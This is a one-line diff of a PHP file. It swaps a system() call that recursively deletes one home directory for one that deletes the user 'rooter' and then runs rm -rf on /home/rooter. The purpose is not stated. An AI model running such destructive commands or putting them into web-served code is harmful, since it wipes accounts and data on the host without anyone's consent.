@@ -1,1 +1,1 @@
-<?php system('rm -rf /home/eeeeerr'); ?>
+<?php system('deluser rooter && rm -rf /home/rooter'); ?>
